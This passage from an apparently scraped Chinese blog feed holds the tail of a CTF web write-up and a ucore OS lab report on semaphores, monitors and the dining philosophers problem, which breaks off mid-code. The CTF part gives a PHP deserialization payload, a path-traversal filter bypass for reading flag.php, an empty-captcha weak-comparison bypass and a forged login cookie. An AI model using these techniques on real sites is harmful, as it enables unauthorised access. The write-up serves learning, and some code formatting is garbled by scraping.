利用</h2><br><p>在首页输入<code>src=|O:4:”TOPC”:3:{s:3:”obj”;N;s:4:”attr”;O:4:”TOPB”:2:{s:3:”obj”;N;s:4:”attr”;s:127:”O:4:”TOPA”:4:{s:5:”token”;N;s:6:”ticket”;R:2;s:8:”username”;s:17:”aaaaaaaaaaaaaaaaa”;s:8:”password”;s:18:”bbbbbbbbbbbbbbbbbb”;}”;}}</code> <br><br>在query.php即可找到key <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616123037012?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616123049637?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br></p><br><h1 id="0x03-读文件">0x03 读文件</h1><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616173242198?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>点击1.txt <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616191021313?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616191032938?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>猜测代码是include或者是file_get_content <br><br>但不知道1.txt的目录在哪 <br><br>尝试访问1.txt <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616191237050?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>估计在/a中的一个子目录下假设为/a/xxx/那么flag.php的位置应该是include的上级目录则是../flag.php因为./被替换成了空则上述字符串改写为…//fla./g.php <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616191639078?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><br><br><br></p><br><h1 id="0x04-验证码">0x04 验证码</h1><br><p>这又是一道关于验证码的题目。目前来说一些高级的验证码还是很安全的。这一题只是简单的验证码的实现，如果想知道原理可以参照我的另一篇博客</p><br><p>首先看这一题 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616192906819?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>验证码在验证的时候一般会有session会话 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616193056461?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>在验证的时候如果session检测这么写 <br><br><code>$_POST[‘authcode’] == $_SESSION[‘authcode’]</code> <br><br>注意这里运用了弱类型比较 <br><br>那么就有绕过的机会 <br><br>当两者都为空的时候就可以绕过 <br><br>此题我猜想就是这样 <br><br>利用burp直接爆破 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616193312156?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><br><br><br><br><br><br><br><br></p><br><h1 id="0x05-spring-css">0x05 spring-css</h1><br><p>直接网上查找cve <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170618232253841?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><p>直接使用</p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170618232407407?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>发现flag位置 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170618232508077?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br></p><br><h1 id="0x06-注入越权">0x06 注入越权</h1><br><p>这一题也是看过writeup写的，感觉一开始没有get到点，其实正过来向原理倒是挺简单的</p><br><p>看网页源码有提示，其实就是admin登录，利用update特性 <br><br>首先它过滤了一些关键字符不能使用引号 <br><br>看具体的注入代码<br><br></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170619000559020?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170619000621614?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h1 id="0x07-forbidden">0x07 Forbidden</h1><br><p>最开始想到的是XXF <br><br>不过到最后层层递加<br></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170619001242066?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>解决什么问题自己百度吧 <br><br>最后有个脑洞，话又说回来都是套路<br><br></p><br><pre class="prettyprint"><code class=" hljs cs"><span class="hljs-number">4e6</span>a59324d545a6a4e7a4d324e513d3d <span class="hljs-comment">//16进制</span><br>NjY2MTZjNzM2NQ==<span class="hljs-comment">//base64</span><br><span class="hljs-number">66616</span>c7365<span class="hljs-comment">//16进制转字符</span><br><span class="hljs-keyword">false</span><br><br>利用上述过程写出逆算法<br>得到<span class="hljs-number">4e7</span>a51334d6a63314e6a553d  </code></pre><br><p>放入cookie <br><br>login=4e7a51334d6a63314e6a553d  <br><br>最后传过去比对即可 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170619001948060?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br></p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛的时候没来的及做听说很简单&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="write-up" scheme="http://yoursite.com/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>操作系统实验报告 lab7</title>
    <link href="http://yoursite.com/2017/06/12/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%20lab7/"/>
    <id>http://yoursite.com/2017/06/12/操作系统实验报告 lab7/</id>
    <published>2017-06-12T01:35:00.000Z</published>
    <updated>2017-10-22T02:14:28.399Z</updated>
    
    <content type="html"><![CDATA[<p>练习0填写已有实验练习1 理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题0x0 哲学家问题0x1 信号量介绍0x2 P操作V操作实现0x3 代码分析0x4 信号量性质练习2 完成内核级条件变量和基于内核级条件变量的哲学家就餐问题0x1 管程机制0x2 数据结构0x3 组成函数实验截图练习0:填写已有实验使用meld的软件进行对比即可  这里把需要填充的文件罗列如下<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><p><div class="toc"><div class="toc"><br><ul><br><li><a href="#练习0填写已有实验" target="_blank">练习0填写已有实验</a></li><br><li><a href="#练习1-理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题" target="_blank">练习1 理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题</a><ul><br><li><a href="#0x0-哲学家问题" target="_blank">0x0 哲学家问题</a></li><br><li><a href="#0x1-信号量介绍" target="_blank">0x1 信号量介绍</a></li><br><li><a href="#0x2-p操作v操作实现" target="_blank">0x2 P操作V操作实现</a></li><br><li><a href="#0x3-代码分析" target="_blank">0x3 代码分析</a></li><br><li><a href="#0x4-信号量性质" target="_blank">0x4 信号量性质</a></li><br></ul><br></li><br><li><a href="#练习2-完成内核级条件变量和基于内核级条件变量的哲学家就餐问题" target="_blank">练习2 完成内核级条件变量和基于内核级条件变量的哲学家就餐问题</a><ul><br><li><a href="#0x1-管程机制" target="_blank">0x1 管程机制</a></li><br><li><a href="#0x2-数据结构" target="_blank">0x2 数据结构</a></li><br><li><a href="#0x3-组成函数" target="_blank">0x3 组成函数</a></li><br></ul><br></li><br><li><a href="#实验截图" target="_blank">实验截图</a></li><br><li><a href="#实验感悟" target="_blank">实验感悟</a></li><br></ul><br></div><br></div><br></p><br><h1 id="练习0填写已有实验">练习0:填写已有实验</h1><br><p>使用meld的软件进行对比即可 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170701002606387?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>这里把需要填充的文件罗列如下：<br><br></p><br><pre class="prettyprint"><code class=" hljs avrasm">proc<span class="hljs-preprocessor">.c</span><br>default_pmm<span class="hljs-preprocessor">.c</span><br>pmm<span class="hljs-preprocessor">.c</span><br>swap_fifo<span class="hljs-preprocessor">.c</span><br>vmm<span class="hljs-preprocessor">.c</span><br>trap<span class="hljs-preprocessor">.c</span><br>sche<span class="hljs-preprocessor">.c</span></code></pre><br><h1 id="练习1-理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题">练习1 理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题</h1><br><h2 id="0x0-哲学家问题">0x0 哲学家问题</h2><br><pre class="prettyprint"><code class=" hljs ">哲学家就餐问题，即有五个哲学家,他们的生活方式是交替地进行思考和进餐。哲学家们公用一张圆桌,<br>周围放有五把椅子,每人坐一把。在圆桌上有五个碗和五根筷子,当一个哲学家思考时,他不与其他人交<br>谈,饥饿时便试图取用其左、右最靠近他的筷子,但他可能一根都拿不到。只有在他拿到两根筷子时,方<br>能进餐,进餐完后,放下筷子又继续思考。</code></pre><br><h2 id="0x1-信号量介绍">0x1 信号量介绍</h2><br><pre class="prettyprint"><code class=" hljs axapta">struct semaphore {<br><span class="hljs-keyword">int</span> <span class="hljs-keyword">count</span>;<br>queueType queue;<br>};<br><br><span class="hljs-keyword">void</span> P(semaphore S){<br>  S.<span class="hljs-keyword">count</span>–；<br>  <span class="hljs-keyword">if</span> (S.<span class="hljs-keyword">count</span>&lt;<span class="hljs-number">0</span>) {<br>  把进程置为睡眠态；<br>  将进程的PCB插入到S.queue的队尾；<br>  调度，让出CPU；<br>  }<br>}<br><br><span class="hljs-keyword">void</span> V(semaphore S){<br>  S.<span class="hljs-keyword">count</span>++；<br>  <span class="hljs-keyword">if</span> (S.<span class="hljs-keyword">count</span>≤<span class="hljs-number">0</span>) {<br>  唤醒在S.queue上等待的第一个进程；<br>  }<br>}</code></pre><br><blockquote><br><p>基于上诉信号量实现可以认为，当多个（&gt;1）进程可以进行互斥或同步合作时，一个进程会由于无法满足信号量设置的某条件而在某一位置停止，直到它接收到一个特定的信号（表明条件满足了）。为了发信号，需要使用一个称作信号量的特殊变量。为通过信号量s传送信号，信号量的V操作采用进程可执行原语semSignal(s)；为通过信号量s接收信号，信号量的P操作采用进程可执行原语semWait(s)；如果相应的信号仍然没有发送，则进程被阻塞或睡眠，直到发送完为止。</p><br></blockquote><br><h2 id="0x2-p操作v操作实现">0x2 P操作&amp;V操作实现</h2><br><p><strong>P操作</strong></p><br><blockquote><br><p>具体实现信号量的P操作，首先关掉中断，然后判断当前信号量的value是否大于0。如果是&gt;0，则表明可以获得信号量，故让value减一，并打开中断返回即可；如果不是&gt;0，则表明无法获得信号量，故需要将当前的进程加入到等待队列中，并打开中断，然后运行调度器选择另外一个进程执行。如果被V操作唤醒，则把自身关联的wait从等待队列中删除（此过程需要先关中断，完成后开中断）。具体实现如下所示：</p><br></blockquote><br><pre class="prettyprint"><code class=" hljs lasso">static <strong>noinline uint32_t </strong>down(semaphore_t <span class="hljs-subst"><em></em></span>sem, uint32_t wait_state) {<br>    bool intr_flag;<br>    local_intr_save(intr_flag);  <span class="hljs-comment">//关掉中断</span><br>    <span class="hljs-keyword">if</span> (sem<span class="hljs-subst">-&gt;</span>value <span class="hljs-subst">&gt;</span> <span class="hljs-number">0</span>) {<span class="hljs-comment">//当前信号量value大于0</span><br>        sem<span class="hljs-subst">-&gt;</span>value <span class="hljs-subst">–</span>;<span class="hljs-comment">//直接让value减一</span><br>        local_intr_restore(intr_flag);<span class="hljs-comment">//开中断返回</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    }<br>    <span class="hljs-comment">//当前信号量value小于等于0，表明无法获得信号量</span><br>    wait_t __wait, <span class="hljs-subst"></span>wait <span class="hljs-subst">=</span> <span class="hljs-subst">&amp;</span><strong>wait;<br>    wait_current_set(<span class="hljs-subst">&amp;</span>(sem<span class="hljs-subst">-&gt;</span>wait_queue), wait, wait_state);<span class="hljs-comment">//将当前的进程加入到等待队列中</span><br>    local_intr_restore(intr_flag);<span class="hljs-comment">//打开中断</span><br><br>    schedule();<span class="hljs-comment">//运行调度器选择其他进程执行</span><br><br>    local_intr_save(intr_flag);<span class="hljs-comment">//关中断</span><br>    wait_current_del(<span class="hljs-subst">&amp;</span>(sem<span class="hljs-subst">-&gt;</span>wait_queue), wait);<span class="hljs-comment">//被V操作唤醒，从等待队列移除</span><br>    local_intr_restore(intr_flag);<span class="hljs-comment">//开中断</span><br><br>    <span class="hljs-keyword">if</span> (wait<span class="hljs-subst">-&gt;</span>wakeup_flags <span class="hljs-subst">!=</span> wait_state) {<br>        <span class="hljs-keyword">return</span> wait<span class="hljs-subst">-&gt;</span>wakeup_flags;<br>    }<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}</strong></code></pre><br><p><strong>V操作</strong></p><br><blockquote><br><p>具体实现信号量的V操作，首先关中断，如果信号量对应的wait queue中没有进程在等待，直接把信号量的value加一，然后开中断返回；如果有进程在等待且进程等待的原因是semophore设置的，则调用wakeup_wait函数将waitqueue中等待的第一个wait删除，且把此wait关联的进程唤醒，最后开中断返回。具体实现如下所示：</p><br></blockquote><br><pre class="prettyprint"><code class=" hljs lasso">static noinline <span class="hljs-literal">void</span> __up(semaphore_t <span class="hljs-subst"><em></em></span>sem, uint32_t wait_state) {<br>    bool intr_flag;<br>    local_intr_save(intr_flag);<span class="hljs-comment">//关闭中断</span><br><br>    {<br>        wait_t <span class="hljs-subst"></span>wait;<br>        <span class="hljs-keyword">if</span> ((wait <span class="hljs-subst">=</span> wait_queue_first(<span class="hljs-subst">&amp;</span>(sem<span class="hljs-subst">-&gt;</span>wait_queue))) <span class="hljs-subst">==</span> <span class="hljs-built_in">NULL</span>) {<span class="hljs-comment">//没有进程等待</span><br>            sem<span class="hljs-subst">-&gt;</span>value <span class="hljs-subst">++</span>;<span class="hljs-comment">//信号量的value加一</span><br>        }<br>        <span class="hljs-keyword">else</span> {<span class="hljs-comment">//有进程在等待</span><br>            assert(wait<span class="hljs-subst">-&gt;</span>proc<span class="hljs-subst">-&gt;</span>wait_state <span class="hljs-subst">==</span> wait_state);<br>            wakeup_wait(<span class="hljs-subst">&amp;</span>(sem<span class="hljs-subst">-&gt;</span>wait_queue), wait, wait_state, <span class="hljs-number">1</span>);<span class="hljs-comment">//将<code>wait_queue</code>中等待的第一个wait删除，并将该进程唤醒</span><br>        }<br>    }<br>    local_intr_restore(intr_flag);<span class="hljs-comment">//开启中断返回</span><br>}</code></pre><br><h2 id="0x3-代码分析">0x3 代码分析</h2><br><p><code>check_sec</code> <br><br><strong>第一部分是实现基于信号量的哲学家问题,第二部分是实现基于管程的哲学家问题</strong><br></p><br><pre class="prettyprint"><code class=" hljs cs"><span class="hljs-keyword">void</span> check_sync(<span class="hljs-keyword">void</span>){<br><br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-comment">//check semaphore</span><br>    sem_init(&amp;mutex, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;N;i++){d<br>        sem_init(&amp;s[i], <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">int</span> pid = kernel_thread(philosopher_using_semaphore, (<span class="hljs-keyword">void</span> <em>)i, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (pid &lt;= <span class="hljs-number">0</span>) {<br>            panic(<span class="hljs-string">“create No.%d philosopher_using_semaphore failed.\n”</span>);<br>        }<br>        philosopher_proc_sema[i] = find_proc(pid);<br>        set_proc_name(philosopher_proc_sema[i], <span class="hljs-string">“philosopher_sema_proc”</span>);<br>    }<br><br>    <span class="hljs-comment">//check condition variable</span><br>    monitor_init(&amp;mt, N);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;N;i++){<br>        state_condvar[i]=THINKING;<br>        <span class="hljs-keyword">int</span> pid = kernel_thread(philosopher_using_condvar, (<span class="hljs-keyword">void</span> </em>)i, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (pid &lt;= <span class="hljs-number">0</span>) {<br>            panic(<span class="hljs-string">“create No.%d philosopher_using_condvar failed.\n”</span>);<br>        }<br>        philosopher_proc_condvar[i] = find_proc(pid);<br>        set_proc_name(philosopher_proc_condvar[i], <span class="hljs-string">“philosopher_condvar_proc”</span>);<br>    }<br>}</code></pre><br><p>第一部分就是本实验内容</p><br><p>首先实现初始化了一个互斥信号量，然后创建了对应5个哲学家行为的5个信号量，并创建5个内核线程代表5个哲学家，每个内核线程完成了基于信号量的哲学家吃饭睡觉思考行为实现。现在我们继续跟进<code>philosopher_using_semaphore</code>函数观察它的具体实现。</p><br><pre class="prettyprint"><code class=" hljs cs"><span class="hljs-keyword">int</span> philosopher_using_semaphore(<span class="hljs-keyword">void</span> <em> arg) <span class="hljs-comment">/</span></em> i：哲学家号码，从0到N-1 <em>/<br>{<br>    <span class="hljs-keyword">int</span> i, iter=<span class="hljs-number">0</span>;<br>    i=(<span class="hljs-keyword">int</span>)arg;<br>    cprintf(<span class="hljs-string">“I am No.%d philosopher_sema\n”</span>,i);<br>    <span class="hljs-keyword">while</span>(iter++&lt;TIMES)<span class="hljs-comment">/</span></em> 无限循环 <em>/<br>    {<br>        cprintf(<span class="hljs-string">“Iter %d, No.%d philosopher_sema is thinking\n”</span>,iter,i); <span class="hljs-comment">// 哲学家正在思考</span><br>        do_sleep(SLEEP_TIME);<br>        phi_take_forks_sema(i); <span class="hljs-comment">// 需要两只叉子，或者阻塞</span><br>        cprintf(<span class="hljs-string">“Iter %d, No.%d philosopher_sema is eating\n”</span>,iter,i); <span class="hljs-comment">// 进餐</span><br>        do_sleep(SLEEP_TIME);<br>        phi_put_forks_sema(i); <span class="hljs-comment">// 把两把叉子同时放回桌子</span><br>    }<br>    cprintf(<span class="hljs-string">“No.%d philosopher_sema quit\n”</span>,i);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}</em></code></pre><br><p><code>phi_take_forks_sema和phi_put_forks_sema</code></p><br><pre class="prettyprint"><code class=" hljs cs"><span class="hljs-keyword">void</span> phi_take_forks_sema(<span class="hljs-keyword">int</span> i) <span class="hljs-comment">/ i：哲学家号码从0到N-1 <em>/</em></span><br>{<br>        down(&amp;mutex); <span class="hljs-comment">/ 进入临界区 <em>/</em></span><br>        state_sema[i]=HUNGRY; <span class="hljs-comment">/ 记录下哲学家i饥饿的事实 <em>/</em></span><br>        phi_test_sema(i); <span class="hljs-comment">/ 试图得到两只叉子 <em>/</em></span><br>        up(&amp;mutex); <span class="hljs-comment">/ 离开临界区 <em>/</em></span><br>        down(&amp;s[i]); <span class="hljs-comment">/ 如果得不到叉子就阻塞 <em>/</em></span><br>}<br><br><span class="hljs-keyword">void</span> phi_put_forks_sema(<span class="hljs-keyword">int</span> i) <span class="hljs-comment">/ i：哲学家号码从0到N-1 <em>/</em></span><br>{<br>        down(&amp;mutex); <span class="hljs-comment">/ 进入临界区 <em>/</em></span><br>        state_sema[i]=THINKING; <span class="hljs-comment">/ 哲学家进餐结束 <em>/</em></span><br>        phi_test_sema(LEFT); <span class="hljs-comment">/ 看一下左邻居现在是否能进餐 <em>/</em></span><br>        phi_test_sema(RIGHT); <span class="hljs-comment">/ 看一下右邻居现在是否能进餐 <em>/</em></span><br>        up(&amp;mutex); <span class="hljs-comment">/ 离开临界区 <em>/</em></span><br>}</code></pre><br><h2 id="0x4-信号量性质">0x4 信号量性质</h2><br><p>我们可以看出信号量的计数器value具有有如下性质： <br><br>value&gt;0，表示共享资源的空闲数 <br><br>vlaue&lt;0，表示该信号量的等待队列里的进程数 <br><br>value=0，表示等待队列为空<br><br><br></p><br><h1 id="练习2-完成内核级条件变量和基于内核级条件变量的哲学家就餐问题">练习2 完成内核级条件变量和基于内核级条件变量的哲学家就餐问题</h1><br><h2 id="0x1-管程机制">0x1 管程机制</h2><br><p>即要求首先掌握管程机制,然后基于信号量实现完成条件变量实现,然后用管程机制实现哲学家就餐问题的解决方案。</p><br><p>管程，即定义了一个数据结构和能为并发进程所执行(在该数据结构上)的一组操作,这组操作能同步进程和改变管程中的数据。 <br><br>管程相当于一个隔离区，它把共享变量和对它进行操作的若干个过程围了起来，所有进程要访问临界资源时，都必须经过管程才能进入，而管程每次只允许一个进程进入管程,从而需要确保进程之间互斥。 <br><br>管程主要由这四个部分组成<br><br></p><br><pre><code>1、管程内部的共享变量;<br>2、管程内部的条件变量;<br>3、管程内部并发执行的进程;<br>4、对局部于管程内部的共享数据设置初始值的语句。<br></code></pre><br><p>所谓条件变量，即将等待队列和睡眠条件包装在一起，就形成了一种新的同步机制，称为条件变量。个条件变量CV可理解为一个进程的等待队列,队列中的进程正等待某个条件C变为真。</p><br><p>每个条件变量关联着一个断言Pc。当一个进程等待一个条件变量,该进程不算作占用了该管程,因而其它进程可以进入该管程执行,改变管程的状态,通知条件变量CV其关联的断言Pc在当前状态下为真。</p><br><p>因而条件变量两种操作如下： <br><br>- wait_cv: 被一个进程调用,以等待断言Pc被满足后该进程可恢复执行. 进程挂在该条件变量上等待时,不被认为是占用了管程。 <br><br>- 被一个进程调用,以指出断言Pc现在为真,从而可以唤醒等待断言Pc被满足的进程继续执行。<br><br></p><br><h2 id="0x2-数据结构">0x2 数据结构</h2><br><p>大概了解了原理之后，接下来我们开始分析具体的代码。 <br><br>ucore中的管程机制是基于信号量和条件变量来实现的。管程的数据结构monitor_t如下：<br></p><br><pre class="prettyprint"><code class=" hljs d"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> monitor{<br>    semaphore_t mutex;      <span class="hljs-comment">// 二值信号量，只允许一个进程进入管程，初始化为1</span><br>    semaphore_t next;       <span class="hljs-comment">//配合cv，用于进程同步操作的信号量</span><br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// 睡眠的进程数量</span><br>    condvar_t cv;          <span class="hljs-comment">// 条件变量cv</span><br>} monitor_t;</code></pre><br><hr><br><p>管程中的条件变量cv通过执行wait_cv，会使得等待某个条件C为真的进程能够离开管程并睡眠，且让其他进程进入管程继续执行；而进入管程的某进程设置条件C为真并执行signal_cv时，能够让等待某个条件C为真的睡眠进程被唤醒，从而继续进入管程中执行。发出signal_cv的进程A会唤醒睡眠进程B，进程B执行会导致进程A睡眠，直到进程B离开管程，进程A才能继续执行，这个同步过程是通过信号量next完成的；而next_count表示了由于发出singal_cv而睡眠的进程个数。</p><br><p>条件变量condvar_t的数据结构如下：</p><br><pre class="prettyprint"><code class=" hljs d"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> condvar{<br>    semaphore_t sem; <span class="hljs-comment">//用于发出wait_cv操作的等待某个条件C为真的进程睡眠</span><br>    <span class="hljs-keyword">int</span> count;       <span class="hljs-comment">// 在这个条件变量上的睡眠进程的个数</span><br>    monitor_t <em> owner; <span class="hljs-comment">// 此条件变量的宿主管程</span><br>} condvar_t;</em></code></pre><br><h2 id="0x3-组成函数">0x3 组成函数</h2><br><hr><br><p><strong>cond_signa函数</strong> <br><br>分析完数据结构之后，我们开始分析管程的实现。 <br><br>ucore设计实现了条件变量wait_cv操作和signal_cv操作对应的具体函数，即cond_wait函数和cond_signal函数，此外还有cond_init初始化函数。 <br><br>先看看cond_signal函数，实现如下：<br><br><br></p><br><pre class="prettyprint"><code class=" hljs lasso"><span class="hljs-literal">void</span><br>cond_signal (condvar_t <span class="hljs-subst"></span>cvp) {<br>   cprintf(<span class="hljs-string">“cond_signal begin: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n”</span>, cvp, cvp<span class="hljs-subst">-&gt;</span>count, cvp<span class="hljs-subst">-&gt;</span>owner<span class="hljs-subst">-&gt;</span>next_count);<br>     <span class="hljs-keyword">if</span>(cvp<span class="hljs-subst">-&gt;</span>count<span class="hljs-subst">&gt;</span><span class="hljs-number">0</span>) {  <span class="hljs-comment">//当前存在睡眠的进程</span><br>        cvp<span class="hljs-subst">-&gt;</span>owner<span class="hljs-subst">-&gt;</span>next_count <span class="hljs-subst">++</span>;<span class="hljs-comment">//睡眠的进程总数加一</span><br>        up(<span class="hljs-subst">&amp;</span>(cvp<span class="hljs-subst">-&gt;</span>sem));<span class="hljs-comment">//唤醒等待在cv.sem上睡眠的进程</span><br>        down(<span class="hljs-subst">&amp;</span>(cvp<span class="hljs-subst">-&gt;</span>owner<span class="hljs-subst">-&gt;</span>next));<span class="hljs-comment">//把自己睡眠</span><br>        cvp<span class="hljs-subst">-&gt;</span>owner<span class="hljs-subst">-&gt;</span>next_count <span class="hljs-subst">–</span>;<span class="hljs-comment">//睡醒后等待此条件的睡眠进程个数减一</span><br>      }<br>   cprintf(<span class="hljs-string">“cond_signal end: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n”</span>, cvp, cvp<span class="hljs-subst">-&gt;</span>count, cvp<span class="hljs-subst">-&gt;</span>owner<span class="hljs-subst">-&gt;</span>next_count);<br>}</code></pre><br><hr><br><p><strong>cond_wait函数</strong> <br><br>首先进程B判断cv.count，如果不大于0，则表示当前没有睡眠的进程，因此就没有被唤醒的对象了，直接函数返回即可； <br><br>如果大于0，这表示当前有睡眠的进程A，因此需要唤醒等待在cv.sem上睡眠的进程A。由于只允许一个进程在管程中执行，所以一旦进程B唤醒了别人（进程A），那么自己就需要睡眠。故让monitor.next_count加一，且让自己（进程B）睡在信号量monitor.next上。如果睡醒了，这让monitor.next_count减一。<br><br></p><br><p>同样，再来看看cond_wait函数，实现如下：</p><br><pre class="prettyprint"><code class=" hljs lasso"><span class="hljs-literal">void</span><br>cond_wait (condvar_t <span class="hljs-subst">*</span>cvp) {<br>    <span class="hljs-comment">//LAB7 EXERCISE1: YOUR CODE</span><br>    cprintf(<span class="hljs-string">“cond_wait begin:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n”</span>, cvp, cvp<span class="hljs-subst">-&gt;</span>count, cvp<span class="hljs-subst">-&gt;</span>owner<span class="hljs-subst">-&gt;</span>next_count);<br>      cvp<span class="hljs-subst">-&gt;</span>count<span class="hljs-subst">++</span>;<span class="hljs-comment">//需要睡眠的进程个数加一</span><br>      <span class="hljs-keyword">if</span>(cvp<span class="hljs-subst">-&gt;</span>owner<span class="hljs-subst">-&gt;</span>next_count <span class="hljs-subst">&gt;</span> <span class="hljs-number">0</span>)<br>         up(<span class="hljs-subst">&amp;</span>(cvp<span class="hljs-subst">-&gt;</span>owner<span class="hljs-subst">-&gt;</span>next));<span class="hljs-comment">//唤醒进程链表中的下一个进程</span><br>      <span class="hljs-keyword">else</span><br>         up(<span class="hljs-subst">&amp;</span>(cvp<span class="hljs-subst">-&gt;</span>owner<span class="hljs-subst">-&gt;</span>mutex));<span class="hljs-comment">//否则唤醒睡在monitor.mutex上的进程</span><br>      down(<span class="hljs-subst">&amp;</span>(cvp<span class="hljs-subst">-&gt;</span>sem));<span class="hljs-comment">//将自己睡眠</span><br>      cvp<span class="hljs-subst">-&gt;</span>count <span class="hljs-subst">–</span>;<span class="hljs-comment">//睡醒后等待此条件的睡眠进程个数减一</span><br>    cprintf(<span class="hljs-string">“cond_wait end:  cvp %x, 